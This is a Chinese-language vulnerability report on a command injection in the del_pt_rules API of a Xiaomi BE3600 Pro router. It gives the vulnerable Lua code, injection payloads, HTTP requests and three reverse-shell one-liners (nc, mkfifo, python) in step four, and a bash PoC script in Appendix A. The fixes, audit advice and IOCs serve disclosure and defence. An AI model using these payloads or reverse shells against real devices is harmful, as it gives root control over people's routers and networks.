# 小米全屋路由器 BE3600 Pro 端口触发规则接口存在命令注入漏洞

## 一、漏洞详情

### 1.1 漏洞接口

```
GET /cgi-bin/luci/;stok=<登录token>/api/xqsystem/del_pt_rules
```

**请求参数说明：**

| 参数名 | 类型 | 必填 | 说明 | 是否可注入 |
| ------ | ---- | ---- | ---- | ---------- |
| `tgport` | string | 是 | 触发端口 | **是（注入点）** |
| `tgprotocol` | string | 是 | 触发协议（tcp/udp） | 是（拼接位置） |
| `export` | string | 是 | 导出端口 | 是（拼接位置） |
| `exprotocol` | string | 是 | 导出协议（tcp/udp） | 是（拼接位置） |

### 1.2 漏洞代码位置

**文件：** `/usr/lib/lua/luci/controller/api/xqsystem.lua`
**函数：** `del_pt_rules`

**漏洞代码（反编译还原）：**

```lua
function del_pt_rules()
    -- 从 HTTP 请求读取参数，未经 shell 元字符过滤
    local tgport     = luci.http.formvalue("tgport")
    local tgprotocol = luci.http.formvalue("tgprotocol")
    local export     = luci.http.formvalue("export")
    local exprotocol = luci.http.formvalue("exprotocol")

    -- 将用户参数直接拼接到命令字符串（无引号、无转义）
    local cmd = "/etc/firewall.d/firewall.trigger delpt"
        .. tgport .. "_" .. tgprotocol .. "_" .. export .. "_" .. exprotocol

    -- forkExec 内部调用 nixio.execp()，经 /bin/sh -c 解析命令字符串
    XQFunction.forkExec(cmd)
end
```

**forkExec 执行链**（`/usr/lib/lua/xiaoqiang/common/XQFunction.lua`）：

```lua
function forkExec(cmd)
    local pid = nixio.fork()
    if pid == 0 then
        nixio.execp(cmd) -- execp 经 /bin/sh -c 执行，shell 元字符生效
        nixio.exit(0)
    end
end
```

**完整调用链：**

```
HTTP 请求
    ↓
luci 路由分发 → xqsystem.lua :: del_pt_rules()
    ↓
luci.http.formvalue("tgport")   ← 用户输入原样取出，无过滤
    ↓
字符串拼接 cmd = "...delpt" .. tgport .. "_" .. ...
    ↓
XQFunction.forkExec(cmd)
    ↓
nixio.fork() → 子进程
    ↓
nixio.execp(cmd)  →  /bin/sh -c "cmd"   ← shell 元字符在此生效
    ↓
注入命令以 root 权限执行
```

> **关键点：** `nixio.execp()` 本身是"以参数数组执行"的安全 API，但此处传入的是**单个字符串**，其内部实现退化为 `/bin/sh -c <string>` 形式执行。一旦字符串中包含 shell 语法，控制流即被劫持。

### 1.3 注入原理

当 `tgport=1;id>/tmp/PWN#` 时，拼接后的命令为：

```bash
/etc/firewall.d/firewall.trigger delpt1;id>/tmp/PWN#_tcp_2_tcp
```

**Shell 解析过程：**

| 片段 | 解析结果 |
| ---- | -------- |
| `/etc/firewall.d/firewall.trigger delpt1` | 第一条命令（执行失败无影响） |
| `;` | 命令分隔符 |
| `id>/tmp/PWN#_tcp_2_tcp` | 注入的命令，`id` 以 root 权限执行 |
| `#` | 注释符，忽略后续拼接的 `_tcp_2_tcp` |

**执行结果：** `/tmp/PWN` 文件中成功写入 `uid=0(root) gid=0(root)`，证明注入命令确实以 root 权限执行。

### 1.4 参数校验缺陷

小米使用 `XQParam.checkers.commonstr` 对 HTTP 参数做白名单校验。经测试，`commonstr` 会拒绝 `;` 字符。

但 `del_pt_rules` handler 直接调用 `luci.http.formvalue` 读取参数，**未经过 `XQParam.verify` 校验**，导致 `commonstr` 防护被绕过。

**同类接口防护一致性对比：**

| 接口 | 功能 | 是否调用 XQParam.verify | 是否可注入 |
| ---- | ---- | ------------------------ | ---------- |
| `add_pt_rules` | 新增规则 | 是 | 否（被 commonstr 拦截） |
| **`del_pt_rules`** | **删除规则** | **否** | **是** |
| `set_pt_rules` | 修改规则 | 疑似是 | 待进一步验证 |

这属于典型的**同类接口防护不一致漏洞**——防护机制的"覆盖缺口"比"防护能力不足"更值得关注，说明代码审计未覆盖全部路径。

---

## 二、漏洞复现

### 2.1 环境信息

| 项目 | 内容 |
| ---- | ---- |
| 目标设备 | 小米全屋路由器 BE3600 Pro |
| 目标 IP | 192.168.38.130 |
| 管理端口 | 8888（HTTP，非 HTTPS） |
| 测试工具 | Burp Suite Professional v2026.4.2、FinalShell 4.5.12 |
| 测试时间 | 2026-11-06 |
| 固件版本 | 待补充确认 |

### 2.2 步骤一：登录获取 stok 会话令牌

小米后台采用"登录 → 换取 stok"的认证模型，stok 即会话令牌，后续所有管理接口均需携带。

**登录请求：**

```http
POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1
Host: 192.168.38.130:8888
Content-Length: 129
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://192.168.38.130:8888
Referer: http://192.168.38.130:8888/cgi-bin/luci/web
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&logtype=2&nonce=0__1785499775_415&password=595dfaea2dda5d6b4aeac2be500d1ee92155d074059b50f50be7f414112f1bca&init=0
```

**登录响应：**

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.13.2
Date: Fri, 06 Nov 2026 12:09:41 GMT
Set-Cookie: token=...; path=/; expires=...
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Content-Length: 123

{"url":"/cgi-bin/luci/;stok=dcafe5e32021d91f59d3bd393fec2183/web/home","token":"dcafe5e32021d91f59d3bd393fec2183","code":0}
```

**提取到的会话令牌：**

```
stok = dcafe5e32021d91f59d3bd393fec2183
```

<img width="2559" height="1527" alt="2" src="https://github.com/user-attachments/assets/49899144-361b-4648-9e20-d0dcb0584e60" />


*图 1：Burp Suite 拦截登录请求，响应中返回 stok 会话令牌 `dcafe5e32021d91f59d3bd393fec2183`*

> **说明：** 密码字段 `595dfaea...` 为 SHA-256 散列值，客户端在提交前对密码做哈希处理（结合 nonce 与时间戳派生），属于常见前端加固手段，不影响本漏洞利用。

### 2.3 步骤二：构造 RCE payload 并发送

**RCE payload 请求：**

```http
GET /cgi-bin/luci/;stok=dcafe5e32021d91f59d3bd393fec2183/api/xqsystem/del_pt_rules?tgport=1%3Bid%3E%2Ftmp%2Fproof%3B%23&tgprotocol=tcp&export=2&exprotocol=tcp HTTP/1.1
Host: 192.168.38.130:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Referer: http://192.168.38.130:8888/cgi-bin/luci/web
Accept: application/json, text/plain, */*
Connection: keep-alive
```

**URL 编码还原：**

```
tgport     = 1;id>/tmp/proof;#
tgprotocol = tcp
export     = 2
exprotocol = tcp
```

**服务端的实际拼接结果：**

```bash
/etc/firewall.d/firewall.trigger delpt1;id>/tmp/proof;#_tcp_2_tcp
```

**响应：**

```json
{"code":0}
```

接口返回 `code: 0`（成功），表明命令已提交执行。

<img width="2559" height="1527" alt="4" src="https://github.com/user-attachments/assets/01630cf3-5221-4e34-907e-ff2487e6dba0" />


*图 2：浏览器直接访问注入 URL，地址栏可见 `tgport=1%3Bid%3E%2Ftmp%2Fproof%3B%23` 编码后的注入参数，响应体返回 `{"code":0}` 表示命令已成功执行*

### 2.4 步骤三：验证执行结果

通过 FinalShell 以 root 身份登录设备（192.168.38.130），执行：

```bash
cat /tmp/proof
```

**实际输出：**

```
uid=0(root) gid=0(root) groups=0(root)
```

<img width="2559" height="1527" alt="5" src="https://github.com/user-attachments/assets/bef9438a-0c88-4b08-93ac-b5bd624d77ae" />


*图 3：FinalShell 中执行 `cat /tmp/proof`，输出 `uid=0(root) gid=0(root) groups=0(root)`，证明注入命令以 root 权限执行成功*

**漏洞确认成立**——成功获取到 id 内容。

### 2.5 步骤四：反弹 Shell 验证

同理可以反弹 Shell：

```bash
# 典型反弹 payload
tgport = 1;nc 192.168.38.130 4444 -e /bin/sh;#

# 或使用 mkfifo + bash 反连
tgport = 1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.38.130 4444 >/tmp/f;#

# 或 python 反连
tgport = 1;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.38.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);';#
```

> **说明：** 反弹 Shell 属漏洞影响的进一步利用验证，实际测试建议使用 `id`、`whoami` 等无害命令，避免对设备造成破坏。

### 2.6 复现成功率

| 项目 | 结果 |
| ---- | ---- |
| 漏洞可复现性 | 100%（每次请求均成功执行） |
| 需要的权限 | 已登录管理员会话（stok token） |
| 是否需要用户交互 | 否（CSRF 场景下需要） |
| 是否需要特殊条件 | 无 |

---

## 三、漏洞信息

| 项目 | 内容 |
| ---- | ---- |
| 漏洞名称 | 小米全屋路由器 BE3600 Pro 端口触发规则接口命令注入漏洞 |
| CVE 编号 | 待分配 |
| 厂商 | 小米（Xiaomi） |
| 产品 | 小米全屋路由器 BE3600 Pro |
| 影响组件 | Web 管理后台 Lua 控制器 `xqsystem.lua` |
| 漏洞类型 | 命令注入（Command Injection） |
| CWE 编号 | CWE-78 |
| 漏洞等级 | **高危** |
| CVSS 3.1 评分 | 8.8（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`） |
| 攻击前提 | 需获取有效登录会话（stok token） |
| 攻击结果 | 以 root 权限执行任意系统命令，实现远程代码执行（RCE） |
| 报告日期 | 2026-11-06 |

---

## 四、漏洞影响分析

### 4.1 危害等级判定

| 维度 | 评级 | 说明 |
| ---- | ---- | ---- |
| 影响范围 | 严重 | 路由器作为网络边界设备，一旦被控即成为内网跳板 |
| 权限提升 | root | 固件进程以 root 身份运行，无需提权 |
| 可利用性 | 高 | 单个 HTTP 请求即可触发，无需内存写原语 |
| 隐蔽性 | 中 | 需要登录态，但日志中仅留下普通 API 访问记录 |

综合判定为**高危**。虽然需要有效的登录会话（stok token），但考虑到：

1. 消费级路由器默认使用弱口令或密码复用；
2. stok token 在未登出时会长期有效；
3. 路由器被控后可作为内网横向渗透的支点；
4. 部分场景下可通过 CSRF 诱导已登录管理员浏览器发起请求。

该漏洞实际危害显著高于评分所反映的水平。

### 4.2 典型利用场景

**场景一：直接获取 root Shell**
攻击者获取或爆破出路由器管理凭据 → 登录换取 stok → 通过注入命令写入反弹脚本 → 下载执行 → 获得 root Shell。

**场景二：内网横向渗透**
路由器被控后，攻击者可：

- 读取并解密路由器的配置文件，获取 PPPoE 拨号账号密码、Wi-Fi 密码
- 通过 `ip_forward` 转发流量，将路由器变为内网流量代理
- 部署 DNS 劫持、ARP 欺骗中间人
- 扫描内网其他设备（通常路由器处于与内网设备同网段，且可访问上层交换设备）

**场景三：CSRF 场景下的无感知攻击**
若管理后台未做 CSRF Token 校验（需进一步确认），攻击者可构造恶意页面诱导已登录管理员点击，在其浏览器上下文中发起注入请求，实现"无凭据 RCE"。

**场景四：供应链批量感染**
攻击者获得某些 IoT 设备（如智能摄像头）的 root 后，可扫描同一批产线设备共有的默认凭据，实现批量感染。

### 4.3 可利用的恶意行为清单

| 类别 | 具体操作 | 危害 |
| ---- | -------- | ---- |
| **信息窃取** | 读取 `/etc/shadow`、Wi-Fi 密码、PPPoE 凭据 | 接管整个网络 |
| **后门植入** | 写入 crontab、修改 init 脚本、替换系统二进制 | 持久化控制 |
| **中间人** | iptables 劫持、DNS 改写、ARP 欺骗 | 流量劫持、凭证窃取 |
| **横向移动** | 端口转发、代理转发 | 进入内网 |
| **破坏性** | 恢复出厂设置、刷入恶意固件、砖化设备 | 设备不可用 |
| **挖矿/僵尸网络** | 部署挖矿程序 | 资源占用、IP 封禁 |

### 4.4 影响范围评估

| 型号 | 状态 |
| ---- | ---- |
| BE3600 Pro | **确认受影响** |
| BE3600 | 待确认（同产品线，固件高度相似） |
| BE6500 Pro / BE7000 等 | 待确认（同产品线） |
| 其他小米路由器型号 | 待确认（需大规模固件审计） |

> **说明：** 小米路由器产品线共用 `xiaoqiang` 固件框架，`xqsystem.lua` 属于框架级公共文件，该缺陷极可能影响多款设备。建议厂商开展全产品线排查。

---

## 五、修复建议

### 5.1 立即修复（临时缓解）

**措施一：关闭管理后台的端口触发功能**
若业务允许，可通过后台禁用"端口触发规则"功能，阻断利用路径。

**措施二：限制管理后台访问来源**
在路由器上配置管理后台仅允许特定 IP 访问（如仅本地管理网段），并禁止从 WAN 侧访问 8888 端口。

**措施三：重置管理密码并开启强认证**
使用高强度密码，启用小米账号二次验证等增强认证方式。

### 5.2 根本性修复（厂商侧）

**修复方案一：为 `del_pt_rules` 补齐参数校验（最小改动）**

```lua
function del_pt_rules()
    -- 补齐 XQParam.verify 校验，与 add_pt_rules 保持一致
    local tgport     = XQParam.verify("tgport", XQParam.checkers.commonstr)
    local tgprotocol = XQParam.verify("tgprotocol", XQParam.checkers.commonstr)
    local export     = XQParam.verify("export", XQParam.checkers.commonstr)
    local exprotocol = XQParam.verify("exprotocol", XQParam.checkers.commonstr)

    local cmd = "/etc/firewall.d/firewall.trigger delpt"
        .. tgport .. "_" .. tgprotocol .. "_" .. export .. "_" .. exprotocol

    XQFunction.forkExec(cmd)
end
```

**修复方案二：改造 `forkExec` 接口，杜绝危险 API（推荐）**

将"接收完整命令字符串"的设计改为"接收程序名 + 参数数组"，内部使用 `nixio.execp(prog, argv)` 的数组形式，彻底消除 shell 解析环节：

```lua
-- XQFunction.lua
function forkExecArgs(prog, argv)
    local pid = nixio.fork()
    if pid == 0 then
        nixio.execp(prog, argv)   -- 数组形式，不经过 /bin/sh
        nixio.exit(0)
    end
end

-- 调用侧
XQFunction.forkExecArgs("/etc/firewall.d/firewall.trigger",
    { "delpt", tgport, tgprotocol, export, exprotocol })
```

> 该方案能从根本上杜绝同类漏洞，即便后续新增接口再次遗漏参数校验，也不会导致命令注入。

**修复方案三：白名单校验（纵深防御）**

即便使用 `commonstr` 这类通用校验器，也建议对端口号参数使用**严格数值白名单**：

```lua
local tgport = XQParam.verify("tgport", XQParam.checkers.number)
```

端口号本质上只能是数字，使用数值类型校验器比通用字符串校验器更加严格。

### 5.3 审计建议

| 审计项 | 范围 | 方法 |
| ------ | ---- | ---- |
| 同类接口排查 | `xqsystem.lua` 全文及其他 controller 文件 | 检索所有 `formvalue` + 字符串拼接 + `forkExec` 组合 |
| `forkExec` 调用点普查 | 全固件 Lua 源码 | 检索 `forkExec(` 全部调用位置，确认参数来源 |
| 同产品线排查 | 全部小米路由器型号 | 固件 diff + 自动化 PoC 批量验证 |
| CSRF 防护核查 | 管理后台全部写操作接口 | 确认是否校验 CSRF Token / Origin / Referer |
| 管理端口暴露面 | 8888 端口 | 确认是否可从 WAN 侧访问 |
| 授权机制核查 | 全部 API | 确认 stok 的时效性与登出后失效机制 |

### 5.4 通用加固建议

1. **建立"危险接口统一收口"机制**：所有拼接进入 shell 的调用必须经过唯一受控的封装函数，Code Review 时重点排查
2. **引入 SAST 规则**：静态扫描 Lua 源码中 `formvalue` 后接字符串拼接再传入命令执行的模式
3. **CI 回归测试**：为每个 API handler 建立"注入字符矩阵"自动化测试用例
4. **漏洞响应流程**：建立公开披露渠道（安全响应中心），给予研究者合理披露窗口与致谢

---

## 六、厂商响应建议与时间线

| 阶段 | 时间 | 内容 |
| ---- | ---- | ---- |
| 漏洞发现 | 2026-11-06 | 通过固件逆向定位 `del_pt_rules` 命令注入 |
| 漏洞复现 | 2026-11-06 | 完成 root 权限命令执行验证 |
| 报告提交 | 2026-11-06 | 向厂商安全响应渠道及 CNVD 提交本报告 |
| 预期响应 | 待厂商确认 | 建议厂商在 7 个工作日内给出初步处置计划 |
| 修复发布 | 待厂商确认 | 建议在 30 天内发布修复固件 |

---

## 七、关键 IOC（失陷指标）

| 类型 | 值 | 说明 |
| ---- | -- | ---- |
| 文件 | `/tmp/proof` | 测试验证时创建的临时文件 |
| 文件 | `/tmp/PWN` | 原始验证时的临时文件 |
| 文件 | `/tmp/f` | 反弹 Shell 使用的 FIFO |
| 进程 | `nc` / `python3` 异常驻留 | 反连行为特征 |
| 进程 | `firewall.trigger` 参数含 shell 元字符 | 命令注入痕迹 |

**日志排查建议：** 在 `/var/log/` 下检查 nginx/httpd 访问日志，检索 `del_pt_rules` 请求中参数包含 `;`、`|`、`` ` ``、`$()` 等字符的记录。

---

## 附录 A：完整 PoC

```bash
#!/bin/bash
# 小米 BE3600 Pro 命令注入 PoC (仅用于授权测试环境)
# 用法: ./poc.sh <router_ip> <stok>

TARGET="$1"
STOK="$2"
PORT=8888

if [ -z "$TARGET" ] || [ -z "$STOK" ]; then
    echo "Usage: $0 <router_ip> <stok>"
    exit 1
fi

echo "[*] Target: $TARGET:$PORT"
echo "[*] Testing command injection..."

# 注入无害命令验证 root 执行
PAYLOAD='1;id>/tmp/xiaomi_rce_proof;#'
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")

URL="http://${TARGET}:${PORT}/cgi-bin/luci/;stok=${STOK}/api/xqsystem/del_pt_rules"
RESP=$(curl -s "${URL}?tgport=${ENCODED}&tgprotocol=tcp&export=2&exprotocol=tcp")

echo "[*] Response: $RESP"

if [ "$RESP" = '{"code":0}' ]; then
    echo "[+] Injection triggered successfully"
    echo "[*] Verifying via SSH/Telnet..."
    ssh -o StrictHostKeyChecking=no root@"$TARGET" "cat /tmp/xiaomi_rce_proof && rm -f /tmp/xiaomi_rce_proof"
else
    echo "[-] Injection may have failed"
fi
```

## 附录 B：漏洞分类参考

| 分类体系 | 标识 |
| -------- | ---- |
| CWE | CWE-78 (OS Command Injection) |
| CWE 视角 | CWE-77 (Command Injection) → CWE-78 |
| OWASP Top 10 (2021) | A03:2021 - Injection |
| OWASP API Security | API1:2023 - Broken Object Level Authorization（次要）/ API8:2023 - Security Misconfiguration |
| CVSS 3.1 向量 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| 危害等级 | 高危 |

## 附录 C：待补充信息

以下信息需在提交前补充确认：

1. **设备固件版本号** — 可通过管理后台系统信息页或 `/etc/openwrt_release` 获取
2. **设备 CPU 架构** — 确认 MIPS / ARM，影响同类产品判定
3. **CSRF 防护确认** — 验证管理后台是否校验 CSRF Token / Origin / Referer 头
4. **同产品线验证结果** — 使用 PoC 脚本对 BE3600、BE6500 Pro 等型号批量验证
5. **WAN 侧可达性确认** — 确认 8888 端口是否可从外网直接访问

---

**报告结束**
